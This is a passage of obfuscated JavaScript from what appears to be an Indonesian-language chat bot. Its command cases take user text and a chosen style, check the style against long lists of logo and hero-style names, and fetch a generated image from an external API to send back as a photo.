_0x1ce978[_0x240d04(0x1509)](fetch,_0x3f4cd2);if(!_0x48ec43['ok'])throw await _0x48ec43[_0x240d04(0x1d8c)]();_0x23c0de['replyWithP'+_0x240d04(0x39a)]({'url':_0x3f4cd2},{'caption':lang['ok']});}}break;case _0x1ce978[_0x240d04(0x11c6)]:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0xa25)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978['MqAFl'](_0x1ec495,_0x3e6565)+(_0x240d04(0x1a2d)+_0x240d04(0xdcf)+_0x240d04(0x2d50)+_0x240d04(0x23fb))+_0x1ce978['PKYnn'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x2cd0)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x476bfb(_0x240d04(0x2972)+'ntah:\x0a`'+(_0x1ec495+_0x3e6565)+(_0x240d04(0x1a2d)+'`\x0a\x0aContoh\x20'+_0x240d04(0x2d50)+_0x240d04(0x23fb))+_0x1ce978[_0x240d04(0x466)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x2cd0)));var _0x58693c=_0x483c03['join']('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x1419b4=[_0x1ce978[_0x240d04(0x263e)],_0x1ce978[_0x240d04(0x2020)],_0x1ce978[_0x240d04(0x680)],_0x1ce978[_0x240d04(0x1bba)],_0x1ce978[_0x240d04(0x1931)],_0x240d04(0xee0)];if(!_0x1419b4['includes'](_0x83dd4c))_0x1ce978['JZLDB'](_0x1ce978[_0x240d04(0x1d19)],_0x240d04(0x811))?_0x1ce978[_0x240d04(0x253e)](_0xf233cd,'`I\x27m\x20here`'):_0x1ce978[_0x240d04(0x9bc)](_0x555a99,_0x1419b4,_0x1419b4[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0xe67)]);else{_0x1ce978['QIovZ'](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x543f66=_0x1ce978[_0x240d04(0x188b)](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x108)](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'logo':_0x83dd4c},_0x240d04(0x23aa)),_0x54e2c6=await fetch(_0x543f66);if(!_0x54e2c6['ok'])throw await _0x54e2c6[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x543f66},{'caption':lang['ok']});}}break;case _0x1ce978[_0x240d04(0x1353)]:{if(!_0x33cfb1)return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0xcc5)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1a2d)+'`\x0a\x0aContoh\x20'+_0x240d04(0x2d50)+_0x240d04(0x23fb))+_0x1ce978[_0x240d04(0x125c)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x2cd0)));if(!_0x33cfb1['includes']('|'))return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x1a2d)+_0x240d04(0xdcf)+_0x240d04(0x2d50)+_0x240d04(0x23fb))+_0x1ce978['UvShZ'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x2cd0)));var _0x58693c=_0x483c03['join']('\x20'),_0x2b7b14=_0x58693c['split']('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x1fd6bf=[_0x1ce978[_0x240d04(0x2a30)],_0x1ce978['sAGWY'],_0x1ce978[_0x240d04(0x123c)],_0x1ce978[_0x240d04(0x102)],_0x240d04(0x11e5),_0x1ce978[_0x240d04(0x28bf)],'lion',_0x1ce978[_0x240d04(0x1928)],_0x1ce978[_0x240d04(0x19ea)],_0x240d04(0x517),_0x240d04(0xa77),_0x1ce978[_0x240d04(0xb10)],_0x1ce978['HjaXA'],_0x1ce978['NbSvV'],_0x1ce978[_0x240d04(0x1c74)],_0x1ce978['cotxy']];if(!_0x1fd6bf['includes'](_0x83dd4c))_0x555a99(_0x1fd6bf,_0x1fd6bf[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0xe67)]);else{_0x1ce978[_0x240d04(0xa28)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x4d055f=api(_0x1ce978['WtcHl'],_0x1ce978[_0x240d04(0x442)](_0x1ce978['jrCNG'],_0x3e6565),{'text':_0x2b7b14,'logo':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x2c41c4=await _0x1ce978[_0x240d04(0x1f8a)](fetch,_0x4d055f);if(!_0x2c41c4['ok'])throw await _0x2c41c4['text']();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x4d055f},{'caption':lang['ok']});}}break;case _0x1ce978[_0x240d04(0x235a)]:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x1678)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x265e)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1192)+_0x240d04(0x2e9f)+_0x240d04(0x2890)+_0x240d04(0x2df2))+_0x1ce978['XLyMH'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x1d86)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x1878)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978['lmlMm'](_0x1ec495,_0x3e6565)+(_0x240d04(0x1192)+_0x240d04(0x2e9f)+_0x240d04(0x2890)+_0x240d04(0x2df2))+_0x1ce978[_0x240d04(0x155)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x1d86)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x385f70=[_0x1ce978['MOkFt'],_0x1ce978[_0x240d04(0x2866)],_0x1ce978[_0x240d04(0x79e)]];if(!_0x385f70['includes'](_0x83dd4c))_0x1ce978[_0x240d04(0x21d9)](_0x555a99,_0x385f70,_0x385f70[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x1861)]);else{_0x1ce978['xgeOK'](_0x476bfb,lang['wait']);let _0x1e3434=_0x1ce978['uuwIO'](api,_0x1ce978['WtcHl'],_0x1ce978[_0x240d04(0x1593)],{'text':_0x2b7b14,'style':_0x83dd4c},_0x1ce978['EEoOe']),_0x551074=await _0x1ce978[_0x240d04(0x1cf3)](fetch,_0x1e3434);if(!_0x551074['ok'])throw await _0x551074[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+'hoto']({'url':_0x1e3434},{'caption':lang['ok']});}}break;case _0x1ce978[_0x240d04(0x130d)]:{if(_0x1ce978['WItgz'](_0x1ce978[_0x240d04(0x2b92)],_0x1ce978[_0x240d04(0x2b92)])){if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x1af7)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x1971)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1192)+_0x240d04(0x2e9f)+_0x240d04(0x2890)+_0x240d04(0x2df2))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+'nocturne`'));if(!_0x33cfb1['includes']('|'))return _0x476bfb('Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x1aea)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1192)+_0x240d04(0x2e9f)+_0x240d04(0x2890)+_0x240d04(0x2df2))+_0x1ce978[_0x240d04(0x29ca)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0xda1)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c['split']('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x26af3e=[_0x1ce978[_0x240d04(0x9d2)],_0x1ce978[_0x240d04(0x2a45)],_0x1ce978['jTGbX'],_0x1ce978['FpuMD'],_0x1ce978[_0x240d04(0x263a)],_0x1ce978['RQEvl'],_0x1ce978[_0x240d04(0x2cde)],_0x1ce978[_0x240d04(0x1a06)],_0x240d04(0x83c)+'ks',_0x240d04(0x5f4),_0x1ce978[_0x240d04(0x2a3f)],_0x1ce978[_0x240d04(0x2c1f)],_0x1ce978[_0x240d04(0x74b)],_0x1ce978[_0x240d04(0x28ca)],_0x1ce978[_0x240d04(0x11d7)],_0x1ce978[_0x240d04(0x2dfd)],_0x1ce978[_0x240d04(0x2a89)],_0x1ce978[_0x240d04(0xf7a)],_0x1ce978['BcCqg'],_0x1ce978['IUIpG'],_0x1ce978[_0x240d04(0x1f13)],_0x240d04(0x1cf8),_0x1ce978[_0x240d04(0x19ca)],_0x1ce978[_0x240d04(0x176b)],'yi',_0x240d04(0x10fd),_0x1ce978[_0x240d04(0x2269)],_0x1ce978['vPhpn'],_0x1ce978[_0x240d04(0x230e)],_0x1ce978[_0x240d04(0x1bfe)],_0x240d04(0x1f87),_0x1ce978[_0x240d04(0x2e90)],_0x1ce978[_0x240d04(0x22bd)],_0x1ce978['HZXYO'],_0x1ce978[_0x240d04(0x19d4)],_0x1ce978[_0x240d04(0x1146)],_0x1ce978[_0x240d04(0x12f0)],_0x240d04(0x695),_0x1ce978[_0x240d04(0x23a0)],_0x1ce978[_0x240d04(0x28ca)],_0x1ce978[_0x240d04(0x200)],_0x1ce978['fbHLf'],_0x1ce978[_0x240d04(0x13e6)],_0x240d04(0x14ca),_0x1ce978[_0x240d04(0xdd6)],_0x1ce978[_0x240d04(0x1ae1)],'vi',_0x1ce978['tgeuo'],'darius',_0x1ce978['BaiCS'],_0x1ce978[_0x240d04(0x207a)],_0x1ce978['Fvuoe'],_0x1ce978[_0x240d04(0x62d)],_0x240d04(0x2076)+'ah'];if(!_0x26af3e[_0x240d04(0x55c)](_0x83dd4c))_0x240d04(0xba)!==_0x1ce978[_0x240d04(0x1a86)]?(_0x2c45a8['error'](_0x56137a),_0x1ce978[_0x240d04(0x1f55)](_0x2a7690,_0x1ce978[_0x240d04(0x2e63)])):_0x1ce978['vkeSY'](_0x555a99,_0x26af3e,_0x26af3e[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x1861)]);else{_0x476bfb(lang['wait']);let _0x212180=_0x1ce978[_0x240d04(0x2a4b)](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978['GNBgD'](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'style':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x53a348=await _0x1ce978[_0x240d04(0xe10)](fetch,_0x212180);if(!_0x53a348['ok'])throw await _0x53a348[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x212180},{'caption':lang['ok']});}}else{if(_0x1ce978[_0x240d04(0x1607)](_0x14ef45[_0x1ce978[_0x240d04(0x130c)](_0x1903cc,0x0,_0x551211['length']-0x1)],_0x10d892))_0x4ef30b++;else _0x259203++;}}break;case _0x240d04(0x2d9b)+_0x240d04(0x2c4f):{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x199a)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978['JnCcg'](_0x1ec495,_0x3e6565)+('\x20teks|styl'+'e`\x0a\x0aContoh'+'\x20penggunaa'+_0x240d04(0x2df2))+_0x1ce978[_0x240d04(0x1881)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+'ilumia-5`'));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0xa33)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1192)+_0x240d04(0x2e9f)+_0x240d04(0x2890)+_0x240d04(0x2df2))+_0x1ce978['eQmPd'](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0xc85)));var _0x58693c=_0x483c03['join']('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c['split']('|')[0x1];const _0x5f2e5e=[_0x240d04(0x19d7),_0x1ce978[_0x240d04(0x309)],_0x1ce978['ENkgH'],_0x240d04(0x8c6),_0x240d04(0x544),_0x1ce978[_0x240d04(0x1ee0)],_0x1ce978['EtkvL'],_0x240d04(0x141d),_0x1ce978[_0x240d04(0x338)],_0x240d04(0x1a4c),_0x1ce978['wSFog'],_0x1ce978[_0x240d04(0x7e9)],_0x1ce978[_0x240d04(0x20ff)],_0x1ce978['Ogfel'],_0x1ce978[_0x240d04(0x1e3a)],_0x1ce978['FCtys'],_0x1ce978[_0x240d04(0x9d5)],'laville-2',_0x240d04(0xdc3),_0x240d04(0xb04),_0x240d04(0x3d4),_0x240d04(0x1b68),_0x1ce978[_0x240d04(0x1e68)],_0x1ce978['vRGGE'],_0x1ce978[_0x240d04(0x23b2)],_0x240d04(0xf6a),_0x1ce978[_0x240d04(0x2bc)],_0x1ce978[_0x240d04(0x900)],_0x1ce978[_0x240d04(0xa72)],_0x1ce978[_0x240d04(0x1f4a)],_0x1ce978[_0x240d04(0x642)],_0x240d04(0x1413),_0x1ce978[_0x240d04(0x13e7)],_0x1ce978[_0x240d04(0x9ee)],_0x1ce978[_0x240d04(0x1972)],_0x1ce978[_0x240d04(0x141e)],_0x240d04(0x129f),_0x240d04(0x2d73),_0x1ce978[_0x240d04(0x149b)],_0x1ce978[_0x240d04(0xa00)],_0x1ce978[_0x240d04(0x2b51)],_0x1ce978[_0x240d04(0x719)],_0x240d04(0x966),_0x1ce978[_0x240d04(0x2636)],_0x240d04(0x2d41),_0x1ce978[_0x240d04(0x12b7)],_0x1ce978[_0x240d04(0xb32)],_0x1ce978['fFmYd'],_0x1ce978[_0x240d04(0x26be)],_0x1ce978[_0x240d04(0x2a95)],_0x240d04(0x543),_0x1ce978[_0x240d04(0x12e4)],_0x240d04(0x2b95),_0x1ce978[_0x240d04(0x210e)],_0x1ce978['vWdxA'],_0x1ce978[_0x240d04(0x2791)],_0x240d04(0x23a9),_0x1ce978[_0x240d04(0x14d5)],_0x1ce978['SzGsu'],_0x1ce978[_0x240d04(0x393)],_0x1ce978['mEuoy'],_0x1ce978[_0x240d04(0x2919)],'nax-4',_0x1ce978[_0x240d04(0x209a)],_0x1ce978['ZUsuO'],_0x1ce978[_0x240d04(0x9ab)],_0x1ce978[_0x240d04(0x48c)],_0x240d04(0x50f),_0x1ce978['iVyld'],_0x1ce978[_0x240d04(0x284c)],_0x240d04(0x14a1),_0x240d04(0x1e70),_0x1ce978[_0x240d04(0x9fb)],_0x1ce978[_0x240d04(0x2780)],_0x1ce978[_0x240d04(0x21f9)],_0x1ce978[_0x240d04(0x17db)],_0x1ce978['xQuoR'],_0x1ce978[_0x240d04(0xc1c)],_0x1ce978[_0x240d04(0x977)],'hayate-3',_0x1ce978[_0x240d04(0x229d)],_0x1ce978[_0x240d04(0x2528)],_0x1ce978['WcEpj'],_0x1ce978['BMbvf'],_0x1ce978[_0x240d04(0x26b1)],_0x1ce978[_0x240d04(0x2bcc)],_0x1ce978[_0x240d04(0x33c)],_0x1ce978[_0x240d04(0x148e)],_0x1ce978[_0x240d04(0x6e2)],'ishar',_0x1ce978['vhFtF'],_0x1ce978['mwmeI'],_0x1ce978[_0x240d04(0x124d)],_0x1ce978[_0x240d04(0x1f83)],'qi',_0x240d04(0x1eb3),_0x240d04(0xe2f),_0x1ce978[_0x240d04(0x23c1)],_0x1ce978[_0x240d04(0x26af)],_0x1ce978[_0x240d04(0x40d)],_0x1ce978[_0x240d04(0x180b)],_0x1ce978['EqRou'],_0x1ce978['ATinY'],_0x1ce978[_0x240d04(0x1c4c)],_0x240d04(0x1797),_0x1ce978[_0x240d04(0x115d)],_0x1ce978[_0x240d04(0x656)],_0x1ce978[_0x240d04(0x2c5)],_0x240d04(0x1c9f),_0x240d04(0x18ee),_0x1ce978[_0x240d04(0x19dd)],_0x1ce978['AcljK'],_0x1ce978[_0x240d04(0xef6)],_0x1ce978['SQtza'],_0x1ce978[_0x240d04(0x1270)],_0x1ce978[_0x240d04(0x2e12)],_0x1ce978[_0x240d04(0x707)],_0x1ce978['QHtde'],_0x1ce978[_0x240d04(0x1e8b)],_0x1ce978[_0x240d04(0x850)],_0x1ce978[_0x240d04(0x2b0c)],_0x1ce978['hpdMl'],_0x1ce978[_0x240d04(0x5d3)],_0x1ce978[_0x240d04(0xaa3)],_0x240d04(0x190d),_0x1ce978[_0x240d04(0x8aa)],_0x1ce978[_0x240d04(0x1c0e)],_0x240d04(0x246),_0x1ce978[_0x240d04(0x18eb)],_0x240d04(0x28d3),_0x1ce978[_0x240d04(0xa79)],_0x1ce978['ixOcl'],_0x240d04(0x1060),_0x240d04(0x2539),'fennik',_0x1ce978[_0x240d04(0x1327)],_0x240d04(0x98c),'toro',_0x1ce978[_0x240d04(0x55d)],_0x240d04(0x2a7f),_0x1ce978['UGrcQ'],_0x1ce978[_0x240d04(0x22c6)],_0x1ce978[_0x240d04(0x1f5a)],_0x1ce978['bgnWY'],_0x240d04(0x287e),_0x1ce978[_0x240d04(0x1570)],_0x1ce978[_0x240d04(0x1164)],_0x240d04(0x2c99),'azzenka',_0x1ce978[_0x240d04(0x11bd)],_0x1ce978[_0x240d04(0x2c21)],_0x1ce978[_0x240d04(0xf3)],_0x240d04(0xe68),_0x1ce978[_0x240d04(0x1828)],_0x1ce978[_0x240d04(0x1dd0)],_0x1ce978[_0x240d04(0x385)],_0x1ce978[_0x240d04(0x1465)],_0x1ce978[_0x240d04(0xe57)],_0x1ce978[_0x240d04(0x2c3e)],_0x1ce978[_0x240d04(0x1e6b)],_0x1ce978[_0x240d04(0x2e1f)],_0x1ce978[_0x240d04(0x28f1)],_0x240d04(0x1384),_0x1ce978[_0x240d04(0x2600)],_0x240d04(0xa43),_0x1ce978[_0x240d04(0x73b)],_0x240d04(0x2984),_0x1ce978['vZkqn'],_0x1ce978[_0x240d04(0x2702)],_0x1ce978[_0x240d04(0x1708)],_0x1ce978[_0x240d04(0x3a6)],_0x1ce978['fjMNw'],_0x1ce978[_0x240d04(0x220b)],_0x1ce978[_0x240d04(0x2e49)],_0x240d04(0x1ece),_0x1ce978[_0x240d04(0xd68)],_0x240d04(0x2997),_0x1ce978[_0x240d04(0x1320)],_0x1ce978[_0x240d04(0x25e0)],_0x1ce978[_0x240d04(0x2b0e)],_0x1ce978[_0x240d04(0x508)],_0x240d04(0x2990),_0x1ce978[_0x240d04(0x1ff3)],_0x1ce978[_0x240d04(0x1682)],_0x1ce978[_0x240d04(0x2dc)],_0x240d04(0x15fd),_0x1ce978['VGbFx'],_0x1ce978[_0x240d04(0x2d5)],_0x1ce978[_0x240d04(0x42b)],_0x240d04(0x2a2f),_0x1ce978[_0x240d04(0x854)],_0x1ce978[_0x240d04(0x2a53)],_0x1ce978[_0x240d04(0x21a5)],_0x1ce978[_0x240d04(0x2a3a)],_0x1ce978[_0x240d04(0xb47)],_0x1ce978['inxVF'],_0x1ce978[_0x240d04(0x2c25)],_0x1ce978['zNJUl'],_0x1ce978['cfaEi'],_0x240d04(0x184f),_0x240d04(0x1ef),_0x1ce978['sBvTl'],'zanis-2',_0x1ce978[_0x240d04(0x1717)],_0x240d04(0x1179),_0x240d04(0x1122),_0x1ce978['RMyfD'],_0x1ce978['efkAd'],_0x1ce978[_0x240d04(0x753)],_0x1ce978[_0x240d04(0x2b70)],_0x1ce978[_0x240d04(0xb0b)],_0x1ce978['xEyXC'],_0x1ce978[_0x240d04(0x2500)],_0x1ce978[_0x240d04(0x1356)],_0x1ce978['qZdHO'],_0x1ce978[_0x240d04(0x2847)],_0x1ce978[_0x240d04(0x269e)],_0x1ce978[_0x240d04(0x25c5)],_0x1ce978[_0x240d04(0x71c)],_0x1ce978[_0x240d04(0x566)],_0x240d04(0xa90),_0x240d04(0x9fe),_0x1ce978['HoHhi'],_0x1ce978[_0x240d04(0x2880)],_0x1ce978['Ncxfq'],_0x1ce978[_0x240d04(0x511)],_0x1ce978[_0x240d04(0x1a61)],_0x1ce978[_0x240d04(0xd7e)],_0x240d04(0x1cb8),_0x1ce978[_0x240d04(0x838)],_0x240d04(0x28b8),_0x1ce978[_0x240d04(0x3d5)],_0x1ce978[_0x240d04(0x9e1)],'xeniel-2','telannas-3',_0x1ce978[_0x240d04(0x18b9)],_0x1ce978['hcLgI'],_0x1ce978[_0x240d04(0x1fd6)],_0x1ce978[_0x240d04(0x1c47)],_0x240d04(0x245d),_0x1ce978[_0x240d04(0x872)],_0x1ce978[_0x240d04(0x2a49)],_0x240d04(0x9f9),_0x1ce978['MpsOD'],_0x1ce978[_0x240d04(0xc92)],_0x1ce978['AjlHJ'],_0x1ce978[_0x240d04(0xac2)],_0x1ce978[_0x240d04(0x23ce)],_0x1ce978[_0x240d04(0x1e3b)],_0x1ce978['rrxav'],_0x1ce978[_0x240d04(0x20b5)],_0x1ce978[_0x240d04(0x177e)],_0x1ce978[_0x240d04(0x101e)],_0x1ce978['BZaht'],_0x1ce978['mstPY'],_0x1ce978[_0x240d04(0xc81)],_0x1ce978[_0x240d04(0x12ea)],_0x1ce978['lZIth'],_0x1ce978[_0x240d04(0x2dee)],_0x1ce978[_0x240d04(0x17e7)],_0x1ce978[_0x240d04(0x1d1b)],_0x1ce978[_0x240d04(0x9bf)],_0x1ce978['QQfpX'],_0x240d04(0x144b),_0x1ce978[_0x240d04(0x2c09)],_0x1ce978[_0x240d04(0x9c7)],_0x1ce978[_0x240d04(0x1523)],_0x240d04(0x234d),_0x1ce978[_0x240d04(0xdec)],_0x1ce978[_0x240d04(0x595)],_0x1ce978[_0x240d04(0xcb0)],_0x1ce978[_0x240d04(0xfa2)],'grakk-3',_0x1ce978[_0x240d04(0x1d3d)],'fennik-4',_0x240d04(0xe1c),_0x1ce978[_0x240d04(0x4ba)],_0x1ce978[_0x240d04(0x27f)],_0x1ce978[_0x240d04(0x2254)],_0x1ce978[_0x240d04(0x1adf)],_0x1ce978[_0x240d04(0x21b2)],_0x1ce978[_0x240d04(0x2125)],_0x240d04(0x800),_0x240d04(0x1838),_0x1ce978[_0x240d04(0x2ba1)],_0x1ce978[_0x240d04(0x1061)],_0x1ce978[_0x240d04(0x565)],_0x1ce978[_0x240d04(0x2292)],_0x1ce978[_0x240d04(0xc9b)],_0x1ce978[_0x240d04(0x1272)],'tulen-2',_0x1ce978[_0x240d04(0x2844)],_0x1ce978['UwwKf'],_0x240d04(0x7b0),_0x1ce978[_0x240d04(0x2882)],_0x1ce978[_0x240d04(0x1812)],_0x1ce978['HBlfM'],_0x1ce978['IJXJj'],_0x1ce978['fgfsX'],_0x240d04(0x297b),_0x1ce978['dETZh'],_0x1ce978[_0x240d04(0x2e53)],'liliana-2',_0x1ce978['SIeYP'],_0x1ce978['GMxQM'],_0x1ce978[_0x240d04(0x2198)],_0x1ce978['vNHdw'],_0x240d04(0x712),_0x1ce978[_0x240d04(0x298e)],_0x1ce978['RCKie'],_0x1ce978[_0x240d04(0x1a0)],_0x1ce978[_0x240d04(0x87c)],_0x1ce978['jTgBc'],_0x1ce978[_0x240d04(0x1db2)],_0x1ce978['uheWm'],_0x1ce978[_0x240d04(0x10f6)],_0x1ce978['dcJmr'],_0x240d04(0x487),_0x1ce978[_0x240d04(0x1de7)],'alice-3',_0x240d04(0x36c),_0x1ce978[_0x240d04(0x2099)],_0x1ce978[_0x240d04(0xf8a)],_0x1ce978[_0x240d04(0x3c4)],_0x240d04(0x227e),_0x1ce978[_0x240d04(0xb4b)],_0x1ce978[_0x240d04(0x1ea5)],_0x1ce978['ryxEg'],_0x1ce978[_0x240d04(0x10a3)],_0x1ce978[_0x240d04(0x2dd)],_0x1ce978[_0x240d04(0x1aa8)],_0x240d04(0x1f91),_0x240d04(0xc34)+'7',_0x1ce978['LESsj'],_0x240d04(0x2425),'superman-3',_0x240d04(0x1c42),_0x240d04(0x158e),_0x240d04(0x2ec4)+'ng',_0x1ce978['oBUsb'],'roxie',_0x1ce978['HPfho'],_0x240d04(0x2ef5),_0x240d04(0x12b6),_0x240d04(0x121a),_0x1ce978['dgXnH'],_0x1ce978[_0x240d04(0x241d)],_0x1ce978[_0x240d04(0x108f)],_0x1ce978['RIGlb'],_0x1ce978[_0x240d04(0x1a49)],_0x1ce978[_0x240d04(0x259a)],_0x1ce978[_0x240d04(0x1751)],_0x240d04(0x91b),_0x1ce978[_0x240d04(0x1939)],_0x1ce978[_0x240d04(0x1ee5)],_0x240d04(0x2821),_0x1ce978[_0x240d04(0x29a)],_0x240d04(0x1163),_0x240d04(0xfc7),_0x1ce978[_0x240d04(0xe1)],_0x1ce978[_0x240d04(0x10f5)],_0x240d04(0x199),'omen-3',_0x1ce978[_0x240d04(0x2b5b)],_0x1ce978[_0x240d04(0xb76)],_0x1ce978[_0x240d04(0xa53)],_0x240d04(0x1fa),_0x1ce978[_0x240d04(0x22d7)],_0x1ce978['TcnMx'],_0x1ce978['VSSrD'],_0x1ce978[_0x240d04(0x2edf)],_0x240d04(0x10d4),_0x1ce978[_0x240d04(0x103f)],_0x1ce978[_0x240d04(0x27db)],_0x240d04(0x25aa),_0x1ce978[_0x240d04(0x2b0b)],'violet-7',_0x240d04(0x1153),_0x1ce978['bHMkG'],_0x1ce978[_0x240d04(0xf9d)],_0x1ce978[_0x240d04(0xec3)],'alice-4',_0x240d04(0x17fa),_0x1ce978[_0x240d04(0x806)],_0x1ce978[_0x240d04(0x139f)],'nakroth-6',_0x1ce978[_0x240d04(0xa0b)],_0x1ce978[_0x240d04(0x1fe8)],_0x1ce978['aWvZE'],_0x1ce978[_0x240d04(0x2cb1)],_0x1ce978[_0x240d04(0x23d5)],_0x1ce978[_0x240d04(0x2041)],_0x1ce978[_0x240d04(0x3c0)],_0x1ce978[_0x240d04(0xd60)],_0x1ce978[_0x240d04(0x1e88)],_0x1ce978[_0x240d04(0xc5a)],_0x1ce978['yCVTE'],_0x240d04(0x2651),_0x240d04(0x10e1),_0x240d04(0x28cf),_0x1ce978[_0x240d04(0x3c5)],_0x1ce978['oVEhc'],_0x1ce978[_0x240d04(0x45b)],_0x1ce978[_0x240d04(0x11ce)],_0x1ce978['uRorL'],_0x1ce978[_0x240d04(0xc94)],_0x1ce978[_0x240d04(0x21f5)],_0x1ce978[_0x240d04(0x135d)],_0x240d04(0x7c3),_0x1ce978[_0x240d04(0x2293)],_0x1ce978['onFrv'],_0x1ce978[_0x240d04(0x2ca9)],_0x1ce978[_0x240d04(0x2607)],_0x1ce978[_0x240d04(0x24a)],_0x1ce978[_0x240d04(0x1264)],_0x1ce978['KyIZR'],_0x1ce978['SRqvW'],_0x1ce978[_0x240d04(0x2966)],_0x240d04(0xe05),_0x1ce978[_0x240d04(0x19d0)],_0x1ce978[_0x240d04(0x26fe)],_0x1ce978['wFVCL'],_0x1ce978[_0x240d04(0x27e3)],_0x1ce978[_0x240d04(0x266c)],_0x1ce978[_0x240d04(0x270e)],_0x1ce978[_0x240d04(0xc71)],_0x1ce978[_0x240d04(0x22f)],_0x240d04(0x3fc),_0x1ce978[_0x240d04(0x513)],_0x1ce978['uhfdb'],_0x240d04(0x170f),_0x1ce978[_0x240d04(0x1bbf)],_0x1ce978[_0x240d04(0x1212)],_0x1ce978[_0x240d04(0x1b39)],_0x1ce978[_0x240d04(0x9f1)],_0x1ce978['wfpRc'],_0x1ce978['WQPAy'],_0x1ce978[_0x240d04(0x1ab4)]];if(!_0x5f2e5e['includes'](_0x83dd4c)){if(_0x1ce978[_0x240d04(0x389)](_0x1ce978[_0x240d04(0x2570)],'GcbYr'))_0x1ce978[_0x240d04(0x2c66)](_0x555a99,_0x5f2e5e,_0x5f2e5e[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x1861)]);else return _0x1ce978[_0x240d04(0xb7b)](_0x30d133,_0x1ce978['KdBjs']);}else{_0x1ce978['jisnd'](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x4eb13f=api(_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x2832)](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'style':_0x83dd4c},_0x1ce978['EEoOe']),_0x409a3b=await fetch(_0x4eb13f);if(!_0x409a3b['ok'])throw await _0x409a3b[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x4eb13f},{'caption':lang['ok']});}}break;case'avatarff':{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x98a)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x135c)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1860)+'acter`\x0a\x0aCo'+_0x240d04(0x1f79)+'unaan:\x0a`')+_0x1ce978[_0x240d04(0x2144)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x31b)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return 